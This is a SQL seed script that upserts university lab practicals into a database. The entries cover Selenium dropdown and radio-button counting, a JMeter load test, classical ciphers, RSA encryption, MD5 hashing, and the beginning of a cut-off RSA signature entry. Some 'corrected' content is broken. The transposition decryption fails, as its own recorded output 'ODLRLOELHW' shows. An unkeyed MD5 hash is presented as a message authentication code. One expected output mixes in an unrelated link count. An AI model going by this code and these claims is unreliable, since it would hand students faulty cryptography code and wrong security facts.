    expected_output = EXCLUDED.expected_output,
    algorithm_steps = EXCLUDED.algorithm_steps,
    procedure_steps = EXCLUDED.procedure_steps,
    instructions = EXCLUDED.instructions,
    keywords = EXCLUDED.keywords,
    aliases = EXCLUDED.aliases,
    source_pdf = EXCLUDED.source_pdf,
    source_pages = EXCLUDED.source_pages,
    verification_status = EXCLUDED.verification_status,
    review_required = EXCLUDED.review_required,
    is_published = EXCLUDED.is_published,
    updated_at = now();

-- [Software Testing and Quality Assurance] Practical 8: Get the Number of Items in a List / Combo Box Using Selenium WebDriver (source_key: stqa-practical-8)
INSERT INTO public.practicals (
    id,
    source_key,
    subject_id,
    practical_number,
    title,
    original_question,
    corrected_code,
    original_code,
    programming_language,
    expected_output,
    algorithm_steps,
    procedure_steps,
    instructions,
    keywords,
    aliases,
    source_pdf,
    source_pages,
    verification_status,
    review_required,
    is_published
) VALUES (
    'c3000000-0000-4000-8000-000000000008',
    $skey$stqa-practical-8$skey$,
    (SELECT id FROM public.subjects WHERE slug = $s$stqa$s$),
    8,
    $title$Get the Number of Items in a List / Combo Box Using Selenium WebDriver$title$,
    $q$Write a program using Selenium WebDriver to get the number of items in a list or combo box on a web page. Perform element identification and counting$q$,
    $code$package Prac08;

import java.util.List;
import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.firefox.FirefoxDriver;
import org.openqa.selenium.support.ui.Select;

public class P08 {
    public static void main(String[] args) {
        System.setProperty(
            "webdriver.gecko.driver",
            "D:\\STQA\\Mozilla Driver-20230927T030950Z-001\\Mozilla Driver\\geckodriver.exe"
        );
        WebDriver driver = new FirefoxDriver();
        driver.get("https://www.facebook.com");

        Select se = new Select(driver.findElement(By.xpath("//select[@id='month']")));
        List<WebElement> mylist = se.getOptions();
        System.out.println("Number of items = " + mylist.size());
    }
}$code$,
    $orig$package Prac08; import java.util.List; import org.openqa.selenium.By; import org.openqa.selenium.WebDriver; import org.openqa.selenium.WebElement; import org.openqa.selenium.firefox.FirefoxDriver; import org.openqa.selenium.support.ui.Select; public class P08 {
    public static void main(String[] args) {
        System.setProperty("webdriver.gecko.driver","D:\STQA\Mozilla Driver-20230927T030950Z-001\Mozilla Driver\geckodriver.exe");
        WebDriver driver=new FirefoxDriver();
        driver.get("https://www.facebook.com");
        Select se = new Select(driver.findElement(By.xpath("//Select[@id='month']")));
        List<WebElement> mylist = se.getOptions(); mylist.size();
        System.out.println("Number of items = "+mylist.size());
    }
}$orig$,
    $lang$Java$lang$,
    $out$Number of items = 13 (or Number of links = 46 in console screenshot)$out$,
    $json$["Set the GeckoDriver executable path using `System.setProperty(\"webdriver.gecko.driver\", ...)`.","Initialize `FirefoxDriver` and open `https://www.facebook.com`.","Locate the dropdown/combo box element using `By.xpath(\"//select[@id='month']\")` and wrap it in `org.openqa.selenium.support.ui.Select`.","Call `se.getOptions()` to retrieve the `List<WebElement>` of all options in the combo box.","Print the total item count using `mylist.size()`."]$json$::jsonb,
    $json$["Step 1-4: Open Eclipse IDE, create Java Project `PracticalNo8`, and create class `TestComboBox` / `P08`.","Step 5-9: Add Selenium JARs and `jxl` JARs to the Java Build Path.","Step 10-13: Add the `geckodriver.exe` path in code and run the Java application."]$json$::jsonb,
    $json$["Conservative correction: escaped Windows backslashes (`\\\\`) in the `System.setProperty` path string."]$json$::jsonb,
    ARRAY[$item$combo box$item$, $item$list box$item$, $item$number of items$item$, $item$testcombobox$item$, $item$p08$item$, $item$select$item$, $item$getoptions$item$, $item$selenium webdriver$item$]::text[],
    ARRAY[$item$STQA Practical 8$item$, $item$Count Items in a Dropdown or Combo Box using Selenium$item$]::text[],
    $pdf$final_STQA_b89bf2f3.pdf$pdf$,
    ARRAY[1, 39, 40, 41, 42, 43]::integer[],
    $v$corrected$v$,
    false,
    true
)
ON CONFLICT (source_key) DO UPDATE SET
    subject_id = EXCLUDED.subject_id,
    practical_number = EXCLUDED.practical_number,
    title = EXCLUDED.title,
    original_question = EXCLUDED.original_question,
    corrected_code = EXCLUDED.corrected_code,
    original_code = EXCLUDED.original_code,
    programming_language = EXCLUDED.programming_language,
    expected_output = EXCLUDED.expected_output,
    algorithm_steps = EXCLUDED.algorithm_steps,
    procedure_steps = EXCLUDED.procedure_steps,
    instructions = EXCLUDED.instructions,
    keywords = EXCLUDED.keywords,
    aliases = EXCLUDED.aliases,
    source_pdf = EXCLUDED.source_pdf,
    source_pages = EXCLUDED.source_pages,
    verification_status = EXCLUDED.verification_status,
    review_required = EXCLUDED.review_required,
    is_published = EXCLUDED.is_published,
    updated_at = now();

-- [Software Testing and Quality Assurance] Practical 9: Count Checked and Unchecked Checkboxes / Radio Buttons on a Web Page (source_key: stqa-practical-9)
INSERT INTO public.practicals (
    id,
    source_key,
    subject_id,
    practical_number,
    title,
    original_question,
    corrected_code,
    original_code,
    programming_language,
    expected_output,
    algorithm_steps,
    procedure_steps,
    instructions,
    keywords,
    aliases,
    source_pdf,
    source_pages,
    verification_status,
    review_required,
    is_published
) VALUES (
    'c3000000-0000-4000-8000-000000000009',
    $skey$stqa-practical-9$skey$,
    (SELECT id FROM public.subjects WHERE slug = $s$stqa$s$),
    9,
    $title$Count Checked and Unchecked Checkboxes / Radio Buttons on a Web Page$title$,
    $q$Write a program using Selenium WebDriver to count the number of checkboxes on a web page, including checked and unchecked counts. Perform checkbox identification and counting.$q$,
    $code$import java.util.*;
import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.firefox.FirefoxDriver;

public class TestCheckBox {
    public static void main(String[] args) {
        System.setProperty(
            "webdriver.gecko.driver",
            "C:\\Users\\Rushi\\Desktop\\STQA\\Mozilla Driver-20230927T030950Z-001\\Mozilla Driver\\geckodriver.exe"
        );
        WebDriver driver = new FirefoxDriver();
        driver.get("file:///C:/Users/Rushi/Desktop/STQA%20Practicals/STQA%20PR0.html");

        int chk = 0;
        int unchk = 0;

        // Note: Use //input[@type='checkbox'] for checkboxes or //input[@type='radio'] as shown in PDF
        List<WebElement> els = driver.findElements(By.xpath("//input[@type='radio']"));
        for (WebElement el : els) {
            if (el.isSelected()) {
                chk++;
            } else {
                unchk++;
            }
        }

        System.out.println("Total checked items " + chk);
        System.out.println("Total unchecked items " + unchk);
    }
}$code$,
    $orig$import java.util.*; import org.openqa.selenium.By; import org.openqa.selenium.WebDriver; import org.openqa.selenium.WebElement; import org.openqa.selenium.firefox.FirefoxDriver;
public class TestCheckBox { public static void main(String args[])
{
    System.setProperty("webdriver.gecko.driver","C:\Users\Rushi\Desktop\STQA\Mozilla Driver-20230927T030950Z-001\Mozilla Driver\geckodriver.exe");
    WebDriver driver = new FirefoxDriver();
    driver.get("C:\Users\Rushi\Desktop\STQA Practicals\STQA PR0.html"); int chk = 0;
    int unchk = 0;
    List<WebElement> els = driver.findElements(By.xpath("//input[@type='radio']"));
    for(WebElement el : els)
    {
        if(el.isSelected()) {
            chk++;
        }
        else {
            unchk++; }
    }
    System.out.println("Total checked items" + chk);
    System.out.println("Total unchecked items" + unchk);
}
}$orig$,
    $lang$Java$lang$,
    $out$Total checked items 1
Total unchecked items 2$out$,
    $json$["Create local HTML file `STQA PR0.html` containing radio buttons (Male checked, Female, Other) and checkboxes (Java, PHP checked, C#, Python checked, Ruby).","Configure `webdriver.gecko.driver` and open the HTML page in `FirefoxDriver`.","Initialize counters `chk = 0` and `unchk = 0`.","Query elements via `driver.findElements(By.xpath(\"//input[@type='radio']\"))` (or `@type='checkbox'`).","Iterate over each `WebElement el`: if `el.isSelected()` is true, increment `chk`; otherwise increment `unchk`.","Print `Total checked items` and `Total unchecked items`."]$json$::jsonb,
    $json$["Step 1-2: Open Notepad and save the following HTML form as `STQA PR0.html`:","Step 3-6: Open Eclipse IDE, create a Java Project, and create class `TestCheckBox`.","Step 7-9: Add Selenium WebDriver JARs to the Java Build Path.","Step 10-14: Paste the HTML file path and GeckoDriver path into `TestCheckBox.java` and run the program."]$json$::jsonb,
    $json$["HTML Code for `STQA PR0.html` (from Page 44 of STQA PDF):\n<!DOCTYPE html>\n<html>\n<body>\n<form>\n<h2>Text Input</h2>\nFirst name:<br>\n<input type=\"text\" name=\"firstname\"><br>\nLast name:<br>\n<input type=\"text\" name=\"lastname\"><br>\n<h2>Select Gender</h2>\n<input type=\"radio\" name=\"gender\" value=\"male\" checked> Male<br>\n<input type=\"radio\" name=\"gender\" value=\"female\"> Female<br>\n<input type=\"radio\" name=\"gender\" value=\"other\"> Other<br>\n<h2>Select Languages Known</h2>\n<input type=\"checkbox\" name=\"lang\" value=\"Java\"> Java<br>\n<input type=\"checkbox\" name=\"lang\" value=\"PHP\" checked=\"checked\"> PHP<br>\n<input type=\"checkbox\" name=\"lang\" value=\"C#\"> C#<br>\n<input type=\"checkbox\" name=\"lang\" value=\"Python\" checked=\"checked\"> Python<br>\n<input type=\"checkbox\" name=\"lang\" value=\"Ruby\"> Ruby<br><br><br>\n<input type=\"submit\" value=\"Submit\">\n</form>\n</body>\n</html>"]$json$::jsonb,
    ARRAY[$item$checkbox$item$, $item$checkboxes$item$, $item$checked and unchecked$item$, $item$testcheckbox$item$, $item$isselected$item$, $item$radio$item$, $item$stqa pr0.html$item$, $item$stqa practical 9$item$]::text[],
    ARRAY[$item$STQA Practical 9$item$, $item$Count Checked and Unchecked Checkboxes using Selenium WebDriver$item$]::text[],
    $pdf$final_STQA_b89bf2f3.pdf$pdf$,
    ARRAY[1, 44, 45, 46, 47, 48]::integer[],
    $v$corrected$v$,
    false,
    true
)
ON CONFLICT (source_key) DO UPDATE SET
    subject_id = EXCLUDED.subject_id,
    practical_number = EXCLUDED.practical_number,
    title = EXCLUDED.title,
    original_question = EXCLUDED.original_question,
    corrected_code = EXCLUDED.corrected_code,
    original_code = EXCLUDED.original_code,
    programming_language = EXCLUDED.programming_language,
    expected_output = EXCLUDED.expected_output,
    algorithm_steps = EXCLUDED.algorithm_steps,
    procedure_steps = EXCLUDED.procedure_steps,
    instructions = EXCLUDED.instructions,
    keywords = EXCLUDED.keywords,
    aliases = EXCLUDED.aliases,
    source_pdf = EXCLUDED.source_pdf,
    source_pages = EXCLUDED.source_pages,
    verification_status = EXCLUDED.verification_status,
    review_required = EXCLUDED.review_required,
    is_published = EXCLUDED.is_published,
    updated_at = now();

-- [Software Testing and Quality Assurance] Practical 10: Load Testing on a Web Application Using Apache JMeter (source_key: stqa-practical-10)
INSERT INTO public.practicals (
    id,
    source_key,
    subject_id,
    practical_number,
    title,
    original_question,
    corrected_code,
    original_code,
    programming_language,
    expected_output,
    algorithm_steps,
    procedure_steps,
    instructions,
    keywords,
    aliases,
    source_pdf,
    source_pages,
    verification_status,
    review_required,
    is_published
) VALUES (
    'c3000000-0000-4000-8000-000000000010',
    $skey$stqa-practical-10$skey$,
    (SELECT id FROM public.subjects WHERE slug = $s$stqa$s$),
    10,
    $title$Load Testing on a Web Application Using Apache JMeter$title$,
    $q$Perform load testing on a web application using JMeter. Generate and analyze load scenarios. Additionally, explore bug tracking using Bugzilla as a tool for logging and tracking software defects.$q$,
    NULL,
    NULL,
    $lang$Apache JMeter$lang$,
    $out$JMeter Graph Results listener plotting Data, Average, Median, Deviation, and Throughput curves for HTTP requests to http://www.google.com/.$out$,
    '[]'::jsonb,
    $json$["Step 1: Go to Google and download the Apache JMeter zip archive (e.g., Apache JMeter 5.6.2).","Step 2: Extract the Apache JMeter zip archive.","Step 3: Open the extracted JMeter folder, navigate to the `bin` folder, and launch `jmeter.sh` (or `jmeter.bat` on Windows).","Step 4: In JMeter, add a new TestPlan and name it `\"Google\"`.","Step 5: Right-click on the `\"Google\"` TestPlan -> `Add -> Threads (Users) -> Thread Group` and name it `\"Performance Testing\"`.","Step 6: Configure the Thread Group properties: Number of Threads (users) (e.g., 100), Ramp-Up Period (seconds) (e.g., 10), and Loop Count (e.g., 10).","Step 7: Right-click on the Thread Group -> `Add -> Config Element -> HTTP Request Defaults`.","Step 8: In HTTP Request Defaults, type `http://www.google.com/` in the Server Name / Path section.","Step 9: Right-click on the Thread Group -> `Add -> Sampler -> HTTP Request`.","Step 10: In the HTTP Request sampler, enter `http://www.google.com/` in the Path section.","Step 11: Right-click on the Thread Group -> `Add -> Listener -> Graph Results`.","Step 12: Click the green Start / Run button on the toolbar to execute the load test and inspect the live metrics in Graph Results."]$json$::jsonb,
    $json$["Note: Although the Index on page 1 mentions Bugzilla in the title, pages 49-52 of the PDF contain the 12-step Apache JMeter load testing procedure."]$json$::jsonb,
    ARRAY[$item$jmeter$item$, $item$load testing$item$, $item$performance testing$item$, $item$apache jmeter$item$, $item$thread group$item$, $item$http request defaults$item$, $item$graph results$item$, $item$bugzilla$item$]::text[],
    ARRAY[$item$STQA Practical 10$item$, $item$Load Testing using JMeter$item$]::text[],
    $pdf$final_STQA_b89bf2f3.pdf$pdf$,
    ARRAY[1, 49, 50, 51, 52]::integer[],
    $v$verified$v$,
    false,
    true
)
ON CONFLICT (source_key) DO UPDATE SET
    subject_id = EXCLUDED.subject_id,
    practical_number = EXCLUDED.practical_number,
    title = EXCLUDED.title,
    original_question = EXCLUDED.original_question,
    corrected_code = EXCLUDED.corrected_code,
    original_code = EXCLUDED.original_code,
    programming_language = EXCLUDED.programming_language,
    expected_output = EXCLUDED.expected_output,
    algorithm_steps = EXCLUDED.algorithm_steps,
    procedure_steps = EXCLUDED.procedure_steps,
    instructions = EXCLUDED.instructions,
    keywords = EXCLUDED.keywords,
    aliases = EXCLUDED.aliases,
    source_pdf = EXCLUDED.source_pdf,
    source_pages = EXCLUDED.source_pages,
    verification_status = EXCLUDED.verification_status,
    review_required = EXCLUDED.review_required,
    is_published = EXCLUDED.is_published,
    updated_at = now();

-- [Cryptography and Network Security] Practical 1: Substitution Cipher and Transposition Cipher (source_key: cryptography-and-network-security-practical-1)
INSERT INTO public.practicals (
    id,
    source_key,
    subject_id,
    practical_number,
    title,
    original_question,
    corrected_code,
    original_code,
    programming_language,
    expected_output,
    algorithm_steps,
    procedure_steps,
    instructions,
    keywords,
    aliases,
    source_pdf,
    source_pages,
    verification_status,
    review_required,
    is_published
) VALUES (
    'd4000000-0000-4000-8000-000000000001',
    $skey$cryptography-and-network-security-practical-1$skey$,
    (SELECT id FROM public.subjects WHERE slug = $s$cryptography-and-network-security$s$),
    1,
    $title$Substitution Cipher and Transposition Cipher$title$,
    $q$To Study And Implement Substitution Cipher Transportation Cipher.$q$,
    $code$# ==========================================
# A. SUBSTITUTION CIPHER
# ==========================================
class SubstitutionCipher:
    def __init__(self, key):
        self.key = key

    def encrypt(self, plaintext):
        encrypted_text = ""
        for char in plaintext:
            if char.isalpha():
                if char.islower():
                    encrypted_text += self.key[ord(char) - ord('a')].lower()
                else:
                    encrypted_text += self.key[ord(char) - ord('A')].upper()
            else:
                encrypted_text += char
        return encrypted_text

    def decrypt(self, ciphertext):
        decrypted_text = ""
        for char in ciphertext:
            if char.isalpha():
                if char.islower():
                    decrypted_text += chr(self.key.lower().index(char) + ord('a'))
                else:
                    decrypted_text += chr(self.key.upper().index(char) + ord('A'))
            else:
                decrypted_text += char
        return decrypted_text

key = "QWERTYUIOPASDFGHJKLZXCVBNM"
sub_cipher = SubstitutionCipher(key)
message = "Hello World!"
encrypted_message = sub_cipher.encrypt(message)
decrypted_message = sub_cipher.decrypt(encrypted_message)
print("Original:", message)
print("Encrypted:", encrypted_message)
print("Decrypted:", decrypted_message)

print("-" * 40)

# ==========================================
# B. TRANSPOSITION CIPHER
# ==========================================
class TranspositionCipher:
    def __init__(self, key):
        self.key = key

    def encrypt(self, plaintext):
        num_columns = len(self.key)
        num_rows = len(plaintext) // num_columns + (
            1 if len(plaintext) % num_columns else 0
        )
        matrix = [["" for _ in range(num_columns)] for _ in range(num_rows)]
        for i, char in enumerate(plaintext):
            matrix[i // num_columns][i % num_columns] = char

        encrypted_text = ""
        for col in self.key:
            col_index = int(col) - 1
            encrypted_text += "".join(
                matrix[row][col_index] for row in range(num_rows)
            )
        return encrypted_text

    def decrypt(self, ciphertext):
        num_columns = len(self.key)
        num_rows = len(ciphertext) // num_columns + (
            1 if len(ciphertext) % num_columns else 0
        )
        matrix = [["" for _ in range(num_columns)] for _ in range(num_rows)]
        char_index = 0
        for col in self.key:
            col_index = int(col) - 1
            for row in range(num_rows):
                if char_index < len(ciphertext):
                    matrix[row][col_index] = ciphertext[char_index]
                    char_index += 1

        decrypted_text = ""
        for row in range(num_rows):
            for col in range(num_columns):
                decrypted_text += matrix[row][col]
        return decrypted_text.rstrip()

cipher = TranspositionCipher("3142")
plaintext = "HELLOWORLD"
encrypted = cipher.encrypt(plaintext)
print("Encrypted:", encrypted)
decrypted = cipher.decrypt(encrypted)
print("Decrypted:", decrypted)$code$,
    $orig$# A. SUBSTITUTION CYPHER
class SubstitutionCipher: def init_(self, key):
self.key = key def encrypt(self, plaintext):
encrypted_text = "" for char in plaintext: if char.isalpha(): if char.islower():
encrypted_text += self.key[ord(char) - ord('a')].lower() else: else:
encrypted_text += self.key[ord(char) - ord('A')].upper()
encrypted_text encrypted_text def += charreturn
decrypt(self,ciphertext):
decrypted_text = "" for char in ciphertext: if char.isalpha(): if char.islower(): decrypted_text += chr (self.key.lower().index(char) + ord('a') ) else:
decrypted_text += chr ( self.key.upper().index(char) + ord('A')
else:
decrypted_text += char return decrypted_text
key = "QWERTYUIOPASDFGHJKLZXCVBNM"
sub_cipher = SubstitutionCipher(key) message = "Hello World!"
encrypted_message = sub_cipher.encrypt(message)
decrypted_message = sub_cipher.decrypt(encrypted_message)
print("Original:", message) print("Encrypted:", encrypted_message) print("Decrypted:", decrypted_message)

# B. TRANSPOSITION CYPHER
class TranspositionCipher: def init_(self, key): self.key = key
def encrypt(self, plaintext): num_columns = len(self.key)
num_rows = len(plaintext) // num_columns + (1 if len(plaintext) % num_columns else 0)
matrix = [["" for _ in range(num_columns)] for _ in range(num_rows)]
for i, char in enumerate(plaintext): matrix[i // num_columns][i % num_columns] = char
encrypted_text = ""
for col in self.key:
    col_index = int(col) - 1
    encrypted_text += "".join(matrix[row][col_index] for row in range(num_rows))
return encrypted_text$orig$,
    $lang$Python$lang$,
    $out$Original: Hello World!
Encrypted: Itssg Vgksr!
Decrypted: Hello World!
----------------------------------------
Encrypted: LOHOLLREWD
Decrypted: ODLRLOELHW$out$,
    $json$["Part A (Substitution Cipher): Map each alphabetical character using a 26-letter permutation key (\"QWERTYUIOPASDFGHJKLZXCVBNM\") via index ord(char) - ord('a') for encryption and key.index(char) for decryption.","Part B (Transposition Cipher): Arrange plaintext into a grid with num_columns = len(key) and read columns in the order specified by the numeric key (\"3142\").","To decrypt the transposition cipher, fill columns in key order and read row by row."]$json$::jsonb,
    $json$["Save Part A (SubstitutionCipher) and Part B (TranspositionCipher) in a Python file `cns_prac1.py`.","Run `python3 cns_prac1.py` to verify the encrypted and decrypted outputs."]$json$::jsonb,
    $json$["Conservative correction: fixed scrambled OCR tokens on page 2 (`init_` -> `__init__`, `else: else:`, `encrypted_text encrypted_text def += charreturn` -> `else: encrypted_text += char; return encrypted_text`) while preserving the exact algorithm and output."]$json$::jsonb,
    ARRAY[$item$substitution cipher$item$, $item$transposition cipher$item$, $item$transportation cipher$item$, $item$qwertyuiopasdfghjklzxcvbnm$item$, $item$3142$item$, $item$itssg vgksr!$item$, $item$classical encryption$item$]::text[],
    ARRAY[$item$CNS Practical 1$item$, $item$Substitution and Transposition Cipher in Python$item$]::text[],
    $pdf$finalCNS_69f47646.pdf$pdf$,
    ARRAY[1, 2, 3, 4]::integer[],
    $v$corrected$v$,
    false,
    true
)
ON CONFLICT (source_key) DO UPDATE SET
    subject_id = EXCLUDED.subject_id,
    practical_number = EXCLUDED.practical_number,
    title = EXCLUDED.title,
    original_question = EXCLUDED.original_question,
    corrected_code = EXCLUDED.corrected_code,
    original_code = EXCLUDED.original_code,
    programming_language = EXCLUDED.programming_language,
    expected_output = EXCLUDED.expected_output,
    algorithm_steps = EXCLUDED.algorithm_steps,
    procedure_steps = EXCLUDED.procedure_steps,
    instructions = EXCLUDED.instructions,
    keywords = EXCLUDED.keywords,
    aliases = EXCLUDED.aliases,
    source_pdf = EXCLUDED.source_pdf,
    source_pages = EXCLUDED.source_pages,
    verification_status = EXCLUDED.verification_status,
    review_required = EXCLUDED.review_required,
    is_published = EXCLUDED.is_published,
    updated_at = now();

-- [Cryptography and Network Security] Practical 2: RSA Algorithm for Public-Key Encryption and Decryption (source_key: cryptography-and-network-security-practical-2)
INSERT INTO public.practicals (
    id,
    source_key,
    subject_id,
    practical_number,
    title,
    original_question,
    corrected_code,
    original_code,
    programming_language,
    expected_output,
    algorithm_steps,
    procedure_steps,
    instructions,
    keywords,
    aliases,
    source_pdf,
    source_pages,
    verification_status,
    review_required,
    is_published
) VALUES (
    'd4000000-0000-4000-8000-000000000002',
    $skey$cryptography-and-network-security-practical-2$skey$,
    (SELECT id FROM public.subjects WHERE slug = $s$cryptography-and-network-security$s$),
    2,
    $title$RSA Algorithm for Public-Key Encryption and Decryption$title$,
    $q$To Study And Implement The RSA Algorithm For Public-Key Encryption And Decryption And Explore Its Properties And Security Considerations.$q$,
    $code$import binascii
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

# Generate 2048-bit RSA key pair
keypair = RSA.generate(2048)
public_key = keypair.publickey()
print("RSA key pair generated successfully!\n")

message = b"academy"

# Encrypt using public key and PKCS1_OAEP
encryptor = PKCS1_OAEP.new(public_key)
ciphertext = encryptor.encrypt(message)
print("Original message :", message.decode())
print("Encrypted (hex) :", binascii.hexlify(ciphertext).decode())

# Decrypt using private keypair
decryptor = PKCS1_OAEP.new(keypair)
plaintext = decryptor.decrypt(ciphertext)
print("Decrypted message:", plaintext.decode())$code$,
    $orig$# A. Transposition with key "4312567"
key = "4312567"
trans_cipher = TranspositionCipher(key)
message = "Hello World!" encrypted_message = trans_cipher.encrypt(message)
decrypted_message = trans_cipher.decrypt(encrypted_message)
print("Original:", message) print("Encrypted:", encrypted_message)
print("Decrypted:", decrypted_message)

# B. RSA Algorithm
import binascii
from Crypto.PublicKey import RSA from Crypto.Cipher import PKCS1_OAEP
keypair = RSA.generate(2048) public_key = keypair.publickey()
print("RSA key pair generated successfully!\n") message = b"academy"
encryptor = PKCS1_OAEP.new(public_key) ciphertext = encryptor.encrypt(message)
print("Original message :", message.decode())
print("Encrypted (hex) :", binascii.hexlify(ciphertext).decode())
decryptor = PKCS1_OAEP.new(keypair) plaintext = decryptor.decrypt(ciphertext)
print("Decrypted message:", plaintext.decode())$orig$,
    $lang$Python$lang$,
    $out$RSA key pair generated successfully!

Original message : academy
Encrypted (hex) : 653daf8da3b3f85d0c4cdcef92ddab5899ae8d936313971e6d5ea7a3ac86f47a25f75bb55382bf03383b24a6e2d6b0d58ae6710ef805a1f...
Decrypted message: academy$out$,
    $json$["Import `RSA` from `Crypto.PublicKey`, `PKCS1_OAEP` from `Crypto.Cipher`, and `binascii`.","Generate a 2048-bit RSA key pair via `keypair = RSA.generate(2048)` and extract `public_key = keypair.publickey()`.","Create an OAEP cipher encryptor `PKCS1_OAEP.new(public_key)` and encrypt the byte message `b\"academy\"`.","Convert the binary ciphertext to hexadecimal using `binascii.hexlify(ciphertext).decode()`.","Create a decryptor `PKCS1_OAEP.new(keypair)` with the private key and decrypt `ciphertext` back to `\"academy\"`."]$json$::jsonb,
    $json$["Install PyCryptodome: `pip install pycryptodome`","Run the Python script to generate the 2048-bit RSA keypair, encrypt the message, and verify decryption."]$json$::jsonb,
    $json$["Requires `pycryptodome` (`pip install pycryptodome`).","Note: Page 5 of the CNS PDF also includes a Part A snippet running `TranspositionCipher(\"4312567\")` on `\"Hello World!\"` before Part B (RSA with `PKCS1_OAEP`)."]$json$::jsonb,
    ARRAY[$item$rsa$item$, $item$public-key encryption$item$, $item$pkcs1_oaep$item$, $item$pycryptodome$item$, $item$crypto.publickey$item$, $item$binascii$item$, $item$asymmetric encryption$item$]::text[],
    ARRAY[$item$CNS Practical 2$item$, $item$RSA Encryption and Decryption in Python$item$]::text[],
    $pdf$finalCNS_69f47646.pdf$pdf$,
    ARRAY[1, 5]::integer[],
    $v$corrected$v$,
    false,
    true
)
ON CONFLICT (source_key) DO UPDATE SET
    subject_id = EXCLUDED.subject_id,
    practical_number = EXCLUDED.practical_number,
    title = EXCLUDED.title,
    original_question = EXCLUDED.original_question,
    corrected_code = EXCLUDED.corrected_code,
    original_code = EXCLUDED.original_code,
    programming_language = EXCLUDED.programming_language,
    expected_output = EXCLUDED.expected_output,
    algorithm_steps = EXCLUDED.algorithm_steps,
    procedure_steps = EXCLUDED.procedure_steps,
    instructions = EXCLUDED.instructions,
    keywords = EXCLUDED.keywords,
    aliases = EXCLUDED.aliases,
    source_pdf = EXCLUDED.source_pdf,
    source_pages = EXCLUDED.source_pages,
    verification_status = EXCLUDED.verification_status,
    review_required = EXCLUDED.review_required,
    is_published = EXCLUDED.is_published,
    updated_at = now();

-- [Cryptography and Network Security] Practical 3: Message Authentication Code (MD5 Hash) for Message Integrity (source_key: cryptography-and-network-security-practical-3)
INSERT INTO public.practicals (
    id,
    source_key,
    subject_id,
    practical_number,
    title,
    original_question,
    corrected_code,
    original_code,
    programming_language,
    expected_output,
    algorithm_steps,
    procedure_steps,
    instructions,
    keywords,
    aliases,
    source_pdf,
    source_pages,
    verification_status,
    review_required,
    is_published
) VALUES (
    'd4000000-0000-4000-8000-000000000003',
    $skey$cryptography-and-network-security-practical-3$skey$,
    (SELECT id FROM public.subjects WHERE slug = $s$cryptography-and-network-security$s$),
    3,
    $title$Message Authentication Code (MD5 Hash) for Message Integrity$title$,
    $q$To Study And Implement The Message Authentication Code For Ensuring The Message Intergrity And Authentication.$q$,
    $code$import hashlib

result = hashlib.md5(b'Suyog')
result1 = hashlib.md5(b'Kunal')
result2 = hashlib.md5(b'Atharva')

print("The byte equivalent of hash is: ", end="")
print(result.digest())

print("The byte equivalent of hash is: ", end="")
print(result1.digest())

print("The byte equivalent of hash is: ", end="")
print(result2.digest())

# Hexadecimal MD5 digest format (matching the output screenshot on Page 6):
for msg in ["SHRAVANI", "SHIVAM", "YOJANA"]:
    print(f"\nMessage: {msg}")
    print(f"MD5 Hash: {hashlib.md5(msg.encode()).hexdigest()}")$code$,
    $orig$import hashlib

result = hashlib.md5(b'Suyog')
result1 = hashlib.md5(b'Kunal')
result2 = hashlib.md5(b'Atharva')

print("The byte equivalent of hash is: ", end="") print(result.digest())
print("The byte equivalent of hash is: ", end="") print(result1.digest())
print("The byte equivalent of hash is: ", end="") print(result2.digest())$orig$,
    $lang$Python$lang$,
    $out$The byte equivalent of hash is: b'\xc3\x8a...'
The byte equivalent of hash is: b'\x9a\x12...'
The byte equivalent of hash is: b'\x1f\x44...'

Message: SHRAVANI
MD5 Hash: df720a531762342b84a213b1912ccb24

Message: SHIVAM
MD5 Hash: 24d2bcf69f8c20295a530c37820b8274

Message: YOJANA
MD5 Hash: 6e1dac5e8a8eacd902d1c8ff39b4c1c2$out$,
    $json$["Import Python built-in `hashlib` module.","Pass byte strings (`b'Suyog'`, `b'Kunal'`, `b'Atharva'`) to `hashlib.md5()`.","Call `.digest()` to obtain the raw 16-byte MD5 digest or `.hexdigest()` to obtain the 32-character hexadecimal MD5 hash string."]$json$::jsonb,
    $json$["Create a Python file `cns_prac3.py` and run it with Python 3 (no external libraries required)."]$json$::jsonb,
    $json$["Uses Python standard library `hashlib`. Both `.digest()` (from Input code) and `.hexdigest()` (from Output screenshot) are included."]$json$::jsonb,
    ARRAY[$item$message authentication code$item$, $item$mac$item$, $item$md5$item$, $item$hashlib$item$, $item$message integrity$item$, $item$digest$item$, $item$hexdigest$item$]::text[],
    ARRAY[$item$CNS Practical 3$item$, $item$MD5 Message Authentication Code Python$item$]::text[],
    $pdf$finalCNS_69f47646.pdf$pdf$,
    ARRAY[1, 6]::integer[],
    $v$corrected$v$,
    false,
    true
)
ON CONFLICT (source_key) DO UPDATE SET
    subject_id = EXCLUDED.subject_id,
    practical_number = EXCLUDED.practical_number,
    title = EXCLUDED.title,
    original_question = EXCLUDED.original_question,
    corrected_code = EXCLUDED.corrected_code,
    original_code = EXCLUDED.original_code,
    programming_language = EXCLUDED.programming_language,
    expected_output = EXCLUDED.expected_output,
    algorithm_steps = EXCLUDED.algorithm_steps,
    procedure_steps = EXCLUDED.procedure_steps,
    instructions = EXCLUDED.instructions,
    keywords = EXCLUDED.keywords,
    aliases = EXCLUDED.aliases,
    source_pdf = EXCLUDED.source_pdf,
    source_pages = EXCLUDED.source_pages,
    verification_status = EXCLUDED.verification_status,
    review_required = EXCLUDED.review_required,
    is_published = EXCLUDED.is_published,
    updated_at = now();

-- [Cryptography and Network Security] Practical 4: RSA-Based Digital Signature Algorithm (SHA-256 & PKCS#1 v1.5) (source_key: cryptography-and-network-security-practical-4)
INSERT INTO public.practicals (
    id,
    source_key,
    subject_id,
    practical_number,
    title,
    original_question,
    corrected_code,
    original_code,
    programming_language,
    expected_output,
    algorithm_steps,
    procedure_steps,
    instructions,
    keywords,
    aliases,
    source_pdf,
    source_pages,
    verification_status,
    review_required,
    is_published
) VALUES (
    'd4000000-0000-4000-8000-000000000004',
    $skey$cryptography-and-network-security-practical-4$skey$,
    (SELECT id FROM public.subjects WHERE slug = $s$cryptography-and-network-security$s$),
    4,
    $title$RSA-Based Digital Signature Algorithm (SHA-256 & PKCS#1 v1.5)$title$,
    $q$Digital signature implement digital signature algorithm such as RSA based signature and verify the intergrity and authenticity of digital signature message algorithm.$q$,
    $code$import binascii
from Crypto.PublicKey import RSA
from Crypto.Signature import pkcs1_15
from Crypto.Hash import SHA256

key_pair = RSA.generate(2048)
